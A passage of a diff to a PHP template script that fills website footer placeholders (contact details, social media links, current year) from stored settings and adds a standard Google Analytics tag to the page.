+        $sw_fax = !empty($aws['data']['sw_fax']) ? $aws['data']['sw_fax'] : ''; $f = str_replace("<!--sw_fax-->", $sw_fax, $f);
+        $sw_email = !empty($aws['data']['sw_email']) ? $aws['data']['sw_email'] : ''; $f = str_replace("<!--sw_email-->", $sw_email, $f);
+        $sw_help_desk = !empty($aws['data']['sw_help_desk']) ? $aws['data']['sw_help_desk'] : ''; $f = str_replace("<!--sw_help_desk-->", $sw_help_desk, $f);
+        $sw_iai_interaktif = !empty($aws['data']['sw_iai_interaktif']) ? $aws['data']['sw_iai_interaktif'] : ''; $f = str_replace("<!--sw_iai_interaktif-->", $sw_iai_interaktif, $f);
+        $sw_link_facebook = !empty($aws['data']['sw_link_facebook']) ? $aws['data']['sw_link_facebook'] : ''; $f = str_replace("<!--sw_link_facebook-->", $sw_link_facebook, $f);
+        $sw_link_twitter = !empty($aws['data']['sw_link_twitter']) ? $aws['data']['sw_link_twitter'] : ''; $f = str_replace("<!--sw_link_twitter-->", $sw_link_twitter, $f);
+        $sw_link_instagram = !empty($aws['data']['sw_link_instagram']) ? $aws['data']['sw_link_instagram'] : ''; $f = str_replace("<!--sw_link_instagram-->", $sw_link_instagram, $f);
+        $sw_link_youtube = !empty($aws['data']['sw_link_youtube']) ? $aws['data']['sw_link_youtube'] : ''; $f = str_replace("<!--sw_link_youtube-->", $sw_link_youtube, $f);
+        $sw_link_whatsapp = !empty($aws['data']['sw_link_whatsapp']) ? $aws['data']['sw_link_whatsapp'] : ''; $f = str_replace("<!--sw_link_whatsapp-->", $sw_link_whatsapp, $f);
 #end of get web settings for footer
 
 
-$v = str_replace(" <!--page_css-->", $page_css, $v);	 
+$v = str_replace(" <!--page_css-->", $page_css, $v);
 
-$v = str_replace("<!-- footer_templ -->", $f, $v);	
+$current_year = date('Y');
+$f = str_replace("<!--current_year-->", $current_year, $f);
+
+$v = str_replace("<!-- footer_templ -->", $f, $v);
 
 
 
-$v = str_replace("<!--page_js-->", $page_js, $v);	
+$v = str_replace("<!--page_js-->", $page_js, $v);
 
-$v = str_replace(" <!--beranda_kalkum_css-->", $beranda_kalkum_css, $v);	 
-$v = str_replace(" <!--beranda_kalkum_js-->", $beranda_kalkum_js, $v);	 
+$v = str_replace(" <!--beranda_kalkum_css-->", $beranda_kalkum_css, $v);
+$v = str_replace(" <!--beranda_kalkum_js-->", $beranda_kalkum_js, $v);
 
-$v = str_replace("<!--vURL-->", $v_URL, $v);	
-$v = str_replace("<!--vURL_WEB-->", $v_URL, $v);	
+$v = str_replace("<!--vURL-->", $v_URL, $v);
+$v = str_replace("<!--vURL_WEB-->", $v_URL, $v);
 
-$v = str_replace("<!--url_cms-->", $url_cms, $v);	
+$v = str_replace("<!--url_cms-->", $url_cms, $v);
+
+$gtag = "
+<!-- Google tag (gtag.js) -->
+<script async src='https://www.googletagmanager.com/gtag/js?id=G-1TG1D06KVZ'></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-1TG1D06KVZ');
+</script>
+";
+$v = str_replace("<!--gtag-->", $gtag, $v);
+
 
 if ( !empty($v) )
 {
@@ -888,6 +940,5 @@ else { echo "err.."; }
 
 
 
- 		
-exit(); 
-?>
+
+exit();
